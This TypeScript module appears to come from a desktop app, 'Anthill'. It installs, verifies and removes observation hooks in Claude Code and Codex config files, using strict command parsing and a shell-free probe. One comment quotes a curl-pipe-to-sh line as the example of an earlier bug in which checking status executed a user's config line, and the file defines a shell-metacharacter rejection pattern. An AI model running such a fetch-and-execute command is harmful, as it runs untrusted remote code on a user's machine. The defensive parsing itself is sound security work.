/**
 * Local observation setup.
 *
 * This module only manages Anthill's passive hook entries. Status checks do not
 * write configuration, and install/disable touch only entries whose command is
 * marked as Anthill-owned.
 */

import { copyFile, mkdir, open, readFile, rm, stat, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { dirname, join } from "node:path";

import { detectBinary, runProcess, type SpawnFn } from "@anthill/runtimes";
import type { MarkerCli } from "@anthill/live";

import type {
  ObservationHarnessSetup,
  ObservationSetupActionResult,
  ObservationSetupStatus,
} from "../../shared/ipc.js";

const OWNER_MARKER = "anthill-observation-hook";

/**
 * How much of the end of the hook log a status check reads before giving up
 * and reading it all. Large enough to hold a busy session's recent records.
 */
const TAIL_WINDOW_BYTES = 256 * 1024;

const HARNESS = {
  "claude-code": {
    label: "Claude Code",
    cliCommand: "claude",
    configFile: () => join(homedir(), ".claude", "settings.json"),
    events: [
      "SessionStart",
      "UserPromptSubmit",
      "PreToolUse",
      "PostToolUse",
      "Stop",
      "SubagentStop",
      "Notification",
      "SessionEnd",
    ],
    matcherEvents: new Set(["PreToolUse", "PostToolUse", "Stop", "SubagentStop", "Notification"]),
    boundary:
      "Anthill reads local hook events and Claude Code session transcripts on this machine. It stores only observation state and correlation metadata needed for Live Session UI, never private reasoning.",
  },
  codex: {
    label: "Codex CLI",
    cliCommand: "codex",
    configFile: () => join(homedir(), ".codex", "hooks.json"),
    events: ["SessionStart", "UserPromptSubmit", "PreToolUse", "PostToolUse", "Stop", "SessionEnd"],
    matcherEvents: new Set<string>(),
    boundary:
      "Anthill reads local hook events and Codex rollout/session metadata on this machine. It stores only observation state and correlation metadata needed for Live Session UI, never private reasoning.",
  },
} as const;

/**
 * The harnesses with a config file Anthill can install observation hooks
 * into.
 *
 * pi has no config-file hook mechanism — its extension hooks are TypeScript
 * that pi itself loads — so it is not in this table. Its observation is the
 * session files it writes for itself, which need no install and no status
 * row here.
 */
type HookHarness = "claude-code" | "codex";

type HarnessDefinition = (typeof HARNESS)[HookHarness];

type SetupPrefs = {
  dismissed?: boolean;
  harnesses?: Partial<Record<MarkerCli, { installedAt?: string; disabledAt?: string }>>;
};

export type ObservationSetupPaths = {
  prefsPath?: string;
  /** The machine-wide hook log, so the card can say whether anything arrived. */
  hookLogPath?: string;
  claudeConfigPath?: string;
  codexConfigPath?: string;
  hookHandlerPath?: string;
  /**
   * The interpreter the installed hook command names.
   *
   * Defaults to Anthill's own binary, which is the point: a hook that says
   * `node` is resolved against whatever PATH the harness happens to have, and
   * a machine whose node comes from a version manager usually has none. The
   * app already ships an interpreter that certainly exists — itself, run with
   * `ELECTRON_RUN_AS_NODE`.
   */
  execPath?: string;
};

export class ObservationSetupService {
  constructor(
    private readonly paths: ObservationSetupPaths,
    private readonly spawnFn?: SpawnFn,
  ) {}

  async status(): Promise<ObservationSetupStatus> {
    const prefs = await this.readPrefs();
    return {
      dismissed: prefs.dismissed === true,
      trigger: "Shown after the first meaningful Workflow edit: a workflow is open and the edit makes it unsaved.",
      harnesses: await Promise.all(
        (Object.keys(HARNESS) as HookHarness[]).map((id) => this.describeHarness(id, prefs)),
      ),
    };
  }

  async dismiss(): Promise<ObservationSetupStatus> {
    await this.writePrefs({ dismissed: true });
    return this.status();
  }

  async install(harness: MarkerCli): Promise<ObservationSetupActionResult> {
    return this.modify(harness, "install");
  }

  async disable(harness: MarkerCli): Promise<ObservationSetupActionResult> {
    return this.modify(harness, "disable");
  }

  private async modify(
    harness: MarkerCli,
    action: "install" | "disable",
  ): Promise<ObservationSetupActionResult> {
    try {
      if (!isHookHarnessId(harness)) {
        return {
          ok: false,
          status: await this.status(),
          error: `Unsupported observation harness: ${String(harness)}.`,
        };
      }
      const def = HARNESS[harness];
      const configPath = this.configPath(harness);
      const hookHandlerPath = this.hookHandlerPath();
      if (action === "install" && !existsSync(hookHandlerPath)) {
        return {
          ok: false,
          status: await this.status(),
          error: `Anthill's hook handler was not found at ${hookHandlerPath}.`,
        };
      }

      const before = await this.readJsonObject(configPath);
      const backupPath = await this.backup(configPath);
      const after =
        action === "install"
          ? withAnthillHooks(before, def, harness, hookHandlerPath, this.execPath())
          : withoutAnthillHooks(before, def);
      await mkdir(dirname(configPath), { recursive: true });
      await writeFile(configPath, `${JSON.stringify(after, null, 2)}\n`, "utf8");

      await this.recordHarnessAction(harness, action);
      const status = await this.status();
      const installed = status.harnesses.find((item) => item.id === harness)?.hookInstalled;
      if (action === "install" && !installed) {
        return {
          ok: false,
          status,
          backupPath,
          error: `${def.label} hooks were written, but verification did not find the expected Anthill entries.`,
        };
      }
      return {
        ok: true,
        status,
        backupPath,
        message:
          action === "install"
            ? `${def.label} observation hooks are enabled. This affects Anthill observation only.`
            : `${def.label} observation hooks are disabled. The CLI itself is unchanged.`,
      };
    } catch (error) {
      return {
        ok: false,
        status: await this.status(),
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  private async describeHarness(id: HookHarness, prefs?: SetupPrefs): Promise<ObservationHarnessSetup> {
    const def = HARNESS[id];
    const installedAt = prefs?.harnesses?.[id]?.installedAt;
    const detection = await detectBinary({
      command: def.cliCommand,
      notFoundReason: `${def.label} was not found on your PATH.`,
      spawnFn: this.spawnFn,
    });
    const configPath = this.configPath(id);
    const config = await this.readJsonObject(configPath).catch(() => ({}));
    const hookHandlerPath = this.hookHandlerPath();
    const entriesPresent = hasEveryAnthillHook(config, def) && existsSync(hookHandlerPath);
    // Only worth probing when there is something to probe: a run costs a
    // process, and "not installed" is already the honest answer.
    const commands = anthillCommands(config, def);
    const problem = entriesPresent ? await this.hookProblem(commands, id) : undefined;
    // Asked only when there is an install to describe: a harness with no
    // entries has nothing to have fired.
    const lastEventAt = entriesPresent ? await this.lastHookEvent(id) : undefined;
    return {
      id,
      label: def.label,
      cliCommand: def.cliCommand,
      cliAvailable: detection.available,
      ...(detection.version ? { version: trimVersion(detection.version) } : {}),
      ...(detection.available ? {} : { reason: detection.reason }),
      hookInstalled: entriesPresent && problem === undefined,
      hookEntriesPresent: entriesPresent,
      ...(problem ? { hookProblem: problem } : {}),
      ...(lastEventAt ? { hookLastEventAt: lastEventAt } : {}),
      ...(installedAt && entriesPresent ? { hookInstalledAt: installedAt } : {}),
      configPath,
      hookHandlerPath,
      installerAction:
        "No shell installer command is run. After you click Enable, Anthill's main process backs up and merges Anthill-owned hook entries into this local config file.",
      installCommand: commandFor(id, def.events[0], hookHandlerPath, this.execPath()),
      hookCommands: def.events.map((event) =>
        commandFor(id, event, hookHandlerPath, this.execPath()),
      ),
      eventCategories: def.events.map(labelEvent),
      localDataBoundary: `${def.boundary} MCP is optional and not required for this hooks-based observation.`,
      changes: [
        `Back up ${configPath} before changing it.`,
        `Merge Anthill-owned hook entries into ${configPath}; unrelated hooks stay in place.`,
        `Reference ${hookHandlerPath} from each Anthill hook entry.`,
        "Record hook payloads locally for observation; do not start, attach to, stop, or steer any session.",
      ],
    };
  }

  private configPath(harness: HookHarness): string {
    if (harness === "claude-code") return this.paths.claudeConfigPath ?? HARNESS[harness].configFile();
    return this.paths.codexConfigPath ?? HARNESS[harness].configFile();
  }

  private hookHandlerPath(): string {
    return this.paths.hookHandlerPath ?? join(__dirname, "live-hook-handler.js");
  }

  private execPath(): string {
    return this.paths.execPath ?? process.execPath;
  }

  /**
   * Whether this entry names *this* installation's own executable and handler
   * — the only thing this app will ever spawn.
   *
   * Deliberately stricter than "is it Anthill's line". A path that merely
   * looks like a hook handler is still somebody else's program, so the exact
   * comparison stays exactly where it guards a spawn. What it must not do is
   * decide what the user is *told*: see `hookProblem`.
   */
  private ownHook(command: string, harness?: HookHarness): boolean {
    const parsed = parseHookCommand(command);
    return Boolean(parsed && parsed.runnable &&
      parsed.execPath === this.execPath() && parsed.handlerPath === this.hookHandlerPath() &&
      isHookHarnessId(parsed.harness) && (!harness || parsed.harness === harness) &&
      (HARNESS[parsed.harness].events as readonly string[]).includes(parsed.event));
  }

  /**
   * What is wrong with this harness's Anthill entries, or nothing at all.
   *
   * Four questions, in this order because they are four different questions:
   * is there an entry to speak about; does it name an interpreter nobody here
   * can resolve; is it Anthill's line at all; and does the handler actually
   * run. Only the last one spawns anything, and only ever this installation's
   * own handler.
   *
   * The middle distinction is the one that was missing. An entry another
   * Anthill wrote — the CLI bridge beside the desktop app, a dev build beside
   * the packaged one, last version's bundle beside this one — carries the same
   * marker in the same position, names the same harness and the same slot, and
   * fires perfectly well into the same log this installation reads. Judging it
   * by *this* process's `execPath` made each shell announce the other's
   * working install as "Anthill installed hooks here, but they are not
   * running", and Enable then moved the complaint to the other shell rather
   * than ending it. So a foreign Anthill entry is reported as working and left
   * alone; it is simply never probed, because probing means spawning.
   */
  private async hookProblem(
    commands: { command: string; event: string }[],
    harness: HookHarness,
  ): Promise<string | undefined> {
    const mismatch =
      "The hook config names a different executable, handler or event. Re-enable observation to repair Anthill's entries. No config command was run.";
    if (commands.length === 0) return this.probeHook(undefined);
    if (commands.some(({ command }) => parseHookCommand(command)?.runnable === false)) {
      return "The hook interpreter depends on PATH. Re-enable observation to use Anthill's absolute path.";
    }
    if (commands.some(({ command, event }) => !anthillShaped(command, harness, event))) return mismatch;

    // Every entry is an Anthill line. The ones this installation did not write
    // have to show they are an Anthill at all before they are called working.
    for (const { command } of commands.filter(({ command }) => !this.ownHook(command, harness))) {
      const parsed = parseHookCommand(command);
      if (!parsed || !(await anthillElsewhere(parsed))) return mismatch;
    }
    const own = commands.find(({ command }) => this.ownHook(command, harness));
    return own ? this.probeHook(own.command) : undefined;
  }

  /**
   * Run the hook once, exactly as written, and say what went wrong if it will
   * not run.
   *
   * Checking that the entries exist and the file is on disk was the whole of
   * verification, and it passed on a machine where every hook had been failing
   * since installation — the interpreter the command named was not on the
   * harness's PATH. Entries prove the install wrote them; only running the
   * thing proves the harness can run it.
   *
   * Only a configured command matching this installation's interpreter and
   * handler can be probed, without a shell. Older or altered commands require
   * explicit repair; checking settings must never execute arbitrary programs.
   *
   * It writes to a temporary log rather than the real one, so it exercises the
   * handler's actual job — parse, open, append — without putting a fake event
   * in anybody's record.
   */
  private async probeHook(command: string | undefined): Promise<string | undefined> {
    if (!command) return "No Anthill hook command was found in the config file.";

    /*
     * Taken apart before anything runs, and run as a program rather than as a
     * line of shell.
     *
     * This used to hand the stored string to `/bin/sh -c`, having decided it
     * was Anthill's because the marker appeared somewhere in it. Checking
     * whether observation is set up then ran whatever the config said — a
     * marker in a trailing comment was enough (ANT-102). What is spawned now
     * is the executable the entry names, with its arguments as argv, so there
     * is no shell to interpret anything and nothing to quote.
     */
    const parsed = parseHookCommand(command);
    if (!parsed) {
      return "This hook entry is not one Anthill recognises, so it was not run. Review it in the config file, then re-enable observation to rewrite Anthill's own entries.";
    }
    // A command that names its interpreter by bare name is resolved against
    // whatever PATH the *harness* has, which is not the PATH Anthill has and
    // not one Anthill can see. Such a command can pass the probe here and
    // still fail every time it actually fires — which is exactly what
    // happened. It is unverifiable by construction, so it does not get to be
    // called working, and it is not spawned to find out.
    if (!parsed.runnable) {
      return "The hook command finds its interpreter through PATH, which the harness may not share with Anthill. Re-enable observation to rewrite the entries with an absolute path.";
    }
    if (!this.ownHook(command)) return "The configured hook is not the handler shipped with this Anthill. Re-enable observation to repair it.";
    const log = join(tmpdir(), `anthill-hook-probe-${process.pid}-${Date.now()}.jsonl`);
    try {
      const outcome = await runProcess({
        command: parsed.execPath,
        args: [parsed.handlerPath, OWNER_MARKER, parsed.harness, parsed.event],
        env: { ELECTRON_RUN_AS_NODE: "1", ANTHILL_LIVE_HOOK_LOG: log, ANTHILL_OBSERVATION_PROBE: "1" },
        stdinPayload: "{}",
        timeoutMs: 10_000,
        ...(this.spawnFn ? { spawnFn: this.spawnFn } : {}),
      });
      if (outcome.spawnError) {
        return `The hook command could not be started: ${outcome.spawnError.message}. Re-enable observation to rewrite the hook entries.`;
      }
      if (outcome.exitCode !== 0) {
        const said = (outcome.stderr || outcome.stdout).trim().split("\n")[0];
        return `The hook command exited with ${outcome.exitCode}${said ? `: ${said}` : "."} Re-enable observation to rewrite the hook entries.`;
      }
      return undefined;
    } catch (error) {
      return `The hook command could not be checked: ${(error as Error).message}`;
    } finally {
      await rm(log, { force: true }).catch(() => undefined);
    }
  }

  private hookLogPath(): string {
    return this.paths.hookLogPath ?? join(homedir(), ".anthill", "live-hooks", "events.jsonl");
  }

  /**
   * When this harness last wrote to the hook log, if it ever has.
   *
   * ANT-42. Verification runs the hook command, which proves Anthill can run
   * it; it says nothing about whether the harness ever does. Codex had six
   * entries in `~/.codex/hooks.json`, written with an absolute interpreter
   * path, a handler that runs on demand, and — across eight sessions — not one
   * event. Claude Code's hooks had written hundreds to the same file in the
   * same period, so the log and the handler were both plainly fine. Only the
   * harness was not calling it, and the card said Enabled throughout.
   *
   * Search bounded windows, including the retained rotated file. Older
   * versions left unbounded logs, so even the fallback must have a byte cap.
   */
  private async lastHookEvent(harness: HookHarness): Promise<string | undefined> {
    const marker = `"harness":"${harness}"`;
    const fromTail = await this.searchTail(marker);
    if (fromTail) return fromTail;

    return await this.searchTail(marker, 8 * 1024 * 1024) ??
      await this.searchTail(marker, 8 * 1024 * 1024, `${this.hookLogPath()}.1`);
  }

  /**
   * The newest matching record in the last stretch of the log, if it is there.
   *
   * The first line of the window is dropped: a read that starts mid-file
   * almost certainly starts mid-line, and half a JSON object is not a record.
   */
  private async searchTail(marker: string, limit = TAIL_WINDOW_BYTES, path = this.hookLogPath()): Promise<string | undefined> {
    const handle = await open(path, "r").catch(() => undefined);
    if (!handle) return undefined;
    try {
      const { size } = await handle.stat();
      const window = Math.min(size, limit);
      if (window === 0) return undefined;
      const buffer = Buffer.allocUnsafe(window);
      const { bytesRead } = await handle.read(buffer, 0, window, size - window);
      const lines = buffer.subarray(0, bytesRead).toString("utf8").split("\n");
      if (window < size) lines.shift();
      for (let index = lines.length - 1; index >= 0; index -= 1) {
        if (!lines[index].includes(marker)) continue;
        try {
          const row = JSON.parse(lines[index]) as { recordedAt?: unknown };
          if (typeof row.recordedAt === "string") return row.recordedAt;
        } catch {
          continue;
        }
      }
      return undefined;
    } catch {
      return undefined;
    } finally {
      await handle.close().catch(() => undefined);
    }
  }

  private prefsPath(): string {
    return this.paths.prefsPath ?? join(homedir(), ".anthill", "live-observation-setup.json");
  }

  private async readPrefs(): Promise<SetupPrefs> {
    const text = await readFile(this.prefsPath(), "utf8").catch(() => "");
    if (!text) return {};
    try {
      const parsed = JSON.parse(text) as SetupPrefs;
      return parsed && typeof parsed === "object" ? parsed : {};
    } catch {
      return {};
    }
  }

  private async writePrefs(prefs: SetupPrefs): Promise<void> {
    const path = this.prefsPath();
    await mkdir(dirname(path), { recursive: true });
    await writeFile(path, `${JSON.stringify(prefs, null, 2)}\n`, "utf8");
  }

  private async updatePrefs(update: (prefs: SetupPrefs) => SetupPrefs): Promise<void> {
    await this.writePrefs(update(await this.readPrefs()));
  }

  private async recordHarnessAction(harness: HookHarness, action: "install" | "disable"): Promise<void> {
    const now = new Date().toISOString();
    await this.updatePrefs((prefs) => ({
      ...prefs,
      dismissed: true,
      harnesses: {
        ...(prefs.harnesses ?? {}),
        [harness]:
          action === "install"
            ? { installedAt: now }
            : { ...(prefs.harnesses?.[harness] ?? {}), disabledAt: now },
      },
    }));
  }

  private async readJsonObject(path: string): Promise<Record<string, unknown>> {
    const text = await readFile(path, "utf8").catch((error: NodeJS.ErrnoException) => {
      if (error.code === "ENOENT") return "";
      throw error;
    });
    if (!text.trim()) return {};
    const parsed = JSON.parse(text) as unknown;
    if (!isRecord(parsed)) throw new Error(`${path} is not a JSON object.`);
    return parsed;
  }

  private async backup(path: string): Promise<string | undefined> {
    const exists = await stat(path).then(
      (info) => info.isFile(),
      () => false,
    );
    if (!exists) return undefined;
    const backupPath = `${path}.anthill-backup-${new Date().toISOString().replace(/[:.]/g, "-")}`;
    await copyFile(path, backupPath);
    return backupPath;
  }
}

/**
 * The command an installed hook entry runs.
 *
 * The interpreter is named by absolute path rather than as `node`, because a
 * hook is spawned by the harness with whatever environment the harness has —
 * which on a machine using a version manager does not include the shell PATH
 * where `node` lives. Anthill's own binary is always there, and
 * `ELECTRON_RUN_AS_NODE` makes it behave as node.
 */
function commandFor(
  harness: MarkerCli,
  event: string,
  hookHandlerPath: string,
  execPath: string,
): string {
  return `ELECTRON_RUN_AS_NODE=1 "${execPath}" "${hookHandlerPath}" ${OWNER_MARKER} ${harness} ${event}`;
}

function hookEntry(
  harness: MarkerCli,
  event: string,
  def: HarnessDefinition,
  hookHandlerPath: string,
  execPath: string,
) {
  const entry: Record<string, unknown> = {
    hooks: [
      {
        type: "command",
        command: commandFor(harness, event, hookHandlerPath, execPath),
      },
    ],
  };
  if (def.matcherEvents.has(event)) entry.matcher = "*";
  return entry;
}

function withAnthillHooks(
  config: Record<string, unknown>,
  def: HarnessDefinition,
  harness: MarkerCli,
  hookHandlerPath: string,
  execPath: string,
): Record<string, unknown> {
  const hooks = hooksObject(config);
  for (const event of def.events) {
    const existing = entriesFor(hooks[event]).filter((entry) => !isAnthillEntry(entry));
    hooks[event] = [...existing, hookEntry(harness, event, def, hookHandlerPath, execPath)];
  }
  return { ...config, hooks };
}

function withoutAnthillHooks(
  config: Record<string, unknown>,
  def: HarnessDefinition,
): Record<string, unknown> {
  const hooks = hooksObject(config);
  for (const event of def.events) {
    hooks[event] = entriesFor(hooks[event]).filter((entry) => !isAnthillEntry(entry));
  }
  return { ...config, hooks };
}

/**
 * An Anthill hook entry, taken apart into the pieces it is made of.
 *
 * What a hook entry *is* has to be decided structurally, because the answer
 * decides whether Anthill runs it. It used to be decided by asking whether the
 * string contained the marker anywhere, and the string was then handed whole
 * to `/bin/sh -c` — so a line like
 *
 *     curl example.com/x.sh | sh   # anthill-observation-hook
 *
 * sitting in the user's own Claude or Codex config ran when Anthill merely
 * *checked* whether observation was set up (ANT-102). Checking a status should
 * not execute anything the checker did not write.
 *
 * A marker in a comment is not ownership. The shape below is: the exact
 * command `commandFor` writes, and nothing else.
 */
export type ParsedHookCommand = {
  execPath: string;
  handlerPath: string;
  harness: string;
  event: string;
  /**
   * Whether both paths are absolute, which is what makes it runnable.
   *
   * Ownership and runnability are two questions and this type answers both,
   * because they have different consequences. An entry written by an older
   * Anthill names its interpreter `node` and is still *ours* — the user must
   * be told it needs repair, not that no entries exist — but it is not one
   * this app will spawn, because what `node` resolves to depends on a PATH
   * Anthill cannot see.
   */
  runnable: boolean;
};

/**
 * Anything that would make a shell do more than run one program, in a word
 * that nothing is protecting.
 *
 * This used to be tested against the whole line before tokenising, on the
 * reasoning that the point is not to understand these safely but to have
 * nothing to do with a string containing them. The line this app writes,
 * though, carries two absolute paths *in double quotes* — and macOS hands out
 * paths like `~/Downloads/Anthill (1).app` for the asking. Anthill then wrote
 * an entry it refused to recognise a moment later: hooks that fired perfectly
 * well through the harness's own shell, reported as "Not working" for as long
 * as the app stayed in that folder, with re-enabling producing the same
 * refusal every time.
 *
 * So the question is asked per word, and quoting is the answer to it.
 */
const SHELL_METACHARACTERS = /[;|&$`><(){}[\]!*?~\n\r\\#]/;

/**
 * The few of those that double quotes do *not* defuse.
 *
 * Inside `"…"` a POSIX shell still expands `$` and backticks and still reads
 * `\` as an escape, and a newline ends the line wherever it appears. Those
 * stay refused in every word. The rest — brackets, parentheses, `#`, `!`, `*`
 * — are ordinary characters between quotes, and a folder is allowed to
 * contain them.
 */
const QUOTED_METACHARACTERS = /[$`\\\n\r]/;

/** One word of a hook command, and whether quotes were holding it together. */
type Token = { value: string; quoted: boolean };

/**
 * Split a command the way the writer quoted it: whitespace, and double quotes
 * around the two absolute paths. Not a shell parser — a reader for one shape.
 */
function tokenise(command: string): Token[] | undefined {
  const tokens: Token[] = [];
  let index = 0;
  while (index < command.length) {
    while (index < command.length && command[index] === " ") index += 1;
    if (index >= command.length) break;
    if (command[index] === '"') {
      const end = command.indexOf('"', index + 1);
      if (end === -1) return undefined;
      tokens.push({ value: command.slice(index + 1, end), quoted: true });
      index = end + 1;
      // A quoted token must end the token: `"a"b` is a shell concatenation,
      // and this reader does not do concatenation.
      if (index < command.length && command[index] !== " ") return undefined;
      continue;
    }
    const end = command.indexOf(" ", index);
    const stop = end === -1 ? command.length : end;
    const token = command.slice(index, stop);
    if (token.includes('"')) return undefined;
    tokens.push({ value: token, quoted: false });
    index = stop;
  }
  return tokens;
}

/**
 * The pieces of an Anthill hook entry, or nothing when it is not one.
 *
 * Nothing here trusts the marker on its own. The marker has to be in the
 * argument position this app writes it in, after two absolute paths, with the
 * harness and event after it and nothing else on the line.
 */
export function parseHookCommand(command: string): ParsedHookCommand | undefined {
  const tokens = tokenise(command);
  if (!tokens) return undefined;
  // Quoting is read first and judged second. A word standing on its own gets
  // the whole refusal; a quoted word gets only what quotes cannot hold.
  for (const token of tokens) {
    const forbidden = token.quoted ? QUOTED_METACHARACTERS : SHELL_METACHARACTERS;
    if (forbidden.test(token.value)) return undefined;
  }
  const words = tokens.map((token) => token.value);

  // The one assignment this app writes, and no others: an assignment is a
  // shell feature, and accepting arbitrary ones would accept a way to change
  // what the program does without changing its name.
  const rest = words[0] === "ELECTRON_RUN_AS_NODE=1" ? words.slice(1) : words;
  if (rest.length !== 5) return undefined;

  const [execPath, handlerPath, marker, harness, event] = rest;
  // The marker in the position this app writes it in. A marker anywhere else
  // — a trailing comment, an argument to something else — is somebody's line
  // that mentions Anthill, not Anthill's line.
  if (marker !== OWNER_MARKER) return undefined;
  if (!/^[a-z-]+$/.test(harness) || !/^[A-Za-z]+$/.test(event)) return undefined;

  const runnable = execPath.startsWith("/") && handlerPath.startsWith("/");
  return { execPath, handlerPath, harness, event, runnable };
}

/** How much of a handler file is read looking for Anthill's marker. */
const HANDLER_HEAD_BYTES = 256 * 1024;

/**
 * Whether an entry that is not this installation's is nonetheless an Anthill.
 *
 * Asked only to decide what the user is *told* — never to decide what may be
 * spawned, which stays pinned to this installation's own two paths in
 * `ownHook`. The handler is Anthill's own script and carries the owner marker
 * in its source and in every build of it, so reading the head of the file it
 * names answers the question honestly and cheaply; the executable is a binary
 * this app cannot read anything into, so it is only required to exist.
 *
 * What this is not: proof of authorship. Somebody who can already write the
 * harness's config can also leave a marked file beside it, and the harness
 * will run whatever that config says whatever Anthill's Settings reports.
 * Anthill still never runs it. The bar is set where it changes the answer
 * from "this is broken" to "this is not mine", which is the true one.
 */
async function anthillElsewhere(parsed: ParsedHookCommand): Promise<boolean> {
  if (!existsSync(parsed.execPath)) return false;
  if (await carriesMarker(parsed.handlerPath)) return true;
  /*
   * A packaged Anthill keeps its handler inside `app.asar`. Electron reads
   * into an archive as if it were a directory, so the marker check above
   * answers for one desktop app reading another's entry — but the CLI bridge
   * is plain node, which cannot, and it would then announce every packaged
   * install as broken. The archive's own existence is what can be checked
   * from here, so that is what is checked. Nothing inside it is run either
   * way: `ownHook` still decides that, and it compares whole paths.
   */
  const inside = parsed.handlerPath.indexOf(".asar/");
  return inside > 0 && existsSync(parsed.handlerPath.slice(0, inside + ".asar".length));
}

/** Whether the head of a file carries Anthill's marker. */
async function carriesMarker(path: string): Promise<boolean> {
  const handle = await open(path, "r").catch(() => undefined);
  if (!handle) return false;
  try {
    const buffer = Buffer.alloc(HANDLER_HEAD_BYTES);
    const { bytesRead } = await handle.read(buffer, 0, HANDLER_HEAD_BYTES, 0);
    return buffer.subarray(0, bytesRead).toString("utf8").includes(OWNER_MARKER);
  } catch {
    return false;
  } finally {
    await handle.close().catch(() => undefined);
  }
}

/**
 * Whether a command is an Anthill hook line at all — this installation's or
 * another's.
 *
 * Everything the parser insists on, plus the two facts the parser cannot know
 * on its own: which harness is being described, and which slot the entry was
 * found in. An entry that says `codex` in a Claude config, or `Stop` while
 * sitting under `PreToolUse`, is not Anthill's line however well it parses.
 */
function anthillShaped(command: string, harness: HookHarness, event: string): boolean {
  const parsed = parseHookCommand(command);
  return Boolean(parsed && isHookHarnessId(parsed.harness) &&
    parsed.harness === harness && parsed.event === event);
}

/** The commands Anthill's own entries currently carry — what actually fires. */
function anthillCommands(config: Record<string, unknown>, def: HarnessDefinition): { command: string; event: string }[] {
  const hooks = isRecord(config.hooks) ? config.hooks : {};
  const out: { command: string; event: string }[] = [];
  for (const event of def.events) {
    for (const entry of entriesFor(hooks[event])) {
      // Ownership is the shape of the command, not a substring of it. An
      // entry carrying the marker in a comment is somebody else's line that
      // mentions us, and running it was the bug (ANT-102).
      if (typeof entry.command === "string" && parseHookCommand(entry.command)) {
        out.push({ command: entry.command, event });
        continue;
      }
      for (const hook of Array.isArray(entry.hooks) ? entry.hooks : []) {
        if (isRecord(hook) && typeof hook.command === "string" && hook.command.includes(OWNER_MARKER)) {
          out.push({ command: hook.command, event });
        }
      }
    }
  }
  return out;
}

function hasEveryAnthillHook(config: Record<string, unknown>, def: HarnessDefinition): boolean {
  const hooks = isRecord(config.hooks) ? config.hooks : {};
  return def.events.every((event) => entriesFor(hooks[event]).some(isAnthillEntry));
}

function hooksObject(config: Record<string, unknown>): Record<string, unknown> {
  return isRecord(config.hooks) ? { ...config.hooks } : {};
}

function entriesFor(value: unknown): Record<string, unknown>[] {
  return Array.isArray(value) ? value.filter(isRecord) : [];
}

function isAnthillEntry(entry: Record<string, unknown>): boolean {
  if (typeof entry.command === "string" && entry.command.includes(OWNER_MARKER)) return true;
  const hooks = Array.isArray(entry.hooks) ? entry.hooks : [];
  return hooks.some(
    (hook) => isRecord(hook) && typeof hook.command === "string" && hook.command.includes(OWNER_MARKER),
  );
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

function trimVersion(version: string): string {
  return version.replace(/\s*\([^)]*\)\s*$/, "").trim();
}

function labelEvent(event: string): string {
  return event
    .replace(/([a-z])([A-Z])/g, "$1 $2")
    .replace("Pre Tool Use", "Tool start")
    .replace("Post Tool Use", "Tool completion")
    .replace("User Prompt Submit", "User prompt submit");
}

function isHookHarnessId(value: unknown): value is HookHarness {
  return value === "claude-code" || value === "codex";
}
